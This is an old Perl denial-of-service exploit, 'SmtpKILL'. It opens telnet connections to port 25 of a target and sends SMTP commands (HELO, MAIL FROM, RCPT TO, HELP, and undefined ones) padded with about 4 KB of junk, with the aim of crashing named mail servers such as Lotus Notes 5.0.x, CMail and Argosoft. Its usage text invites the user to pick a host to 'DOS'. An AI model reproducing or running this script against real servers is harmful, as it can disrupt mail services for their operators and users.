#!/usr/bin/perl
# Need net::telnet to run
# Expl0it By smiler@vxd.org
# Tested with sucess against Lotus Notes 5.0.1, 5.0.2b, 5.0.3
# CMail Server version 2.4.6, Argosoft Mail Server version 1.2.1.0 
# and probably many others that I hadnt chance to explore.
# I wrote this after Michal Zalewski brought this issue in BugTraq.
# Cheers 351 and FractalG :)

use Net::Telnet;   


print "SmtpKILL By smiler\@vxd.org\n";

if (not $ARGV[1]) {
print qq~
Usage : smtpkill.pl  <type> <host>
	<type> Type of attack :
		type 1 = long mail from: someone\@4k_of_junk
		type 2 = long rcpt to: someone\@4k_of_junk
		type 3 = long helo longdomain_with_4k_of_junk
		type 4 = long undefined command (4k_of_junk)
		type 5 = long help 4k_of_junk
		type 6 = long mail from: and mail to:

	<host> Host that you want to DOS, Ip or Domain will be ok.
Example Usage : smtpkill.pl 5 127.0.0.1
~; exit;}      

$type=$ARGV[0];
$target=$ARGV[1];

print "TYPE ATTACK: $type\n";
print "TARGET : $target\n";



for ($i=4096;$i<5096;$i++)
 {
        $obj=Net::Telnet->new( Host => "$target",Port => 25);    

	if ($type=~ "1") { 
	$helo="helo ptrulez";
	$from="mail from: v0v0@". 'ptrulez' x $i;
	$rcpt="rcpt to: v0v0\@v0v0.pt";
	}

	if ($type=~ "2") { 
	$helo="helo ptrulez";
	$from="mail from: v0v0\@v0v0.pt";
	$rcpt="rcpt to: v0v0@". 'ptrulez' x $i;
	}

	if ($type=~ "3") {
	$helo="helo ". 'ptrulez' x $i;
	$from="mail from: v0v0\@v0v0.pt";
	$rcpt="rcpt to: v0v0\@v0v0.pt";
	}

	if ($type=~ "4") {
	$helo="havesomefun". 'ptrulez' x $i;
	}

	if ($type=~ "5") {
	$helo="help ". 'ptrulez' x $i;
	}

	if ($type=~ "6") {
	$helo="helo ptrulez";
	$from="mail from: ". 'ptrulez' x $i;
	$rcpt="rcpt to: ". 'ptrulez' x $i;
	}

        print "$helo\n";$obj->print("$helo");   
        print "$from\n";$obj->print("$from");
        print "$rcpt\n";$obj->print("$rcpt");    
        $obj->close;
 }
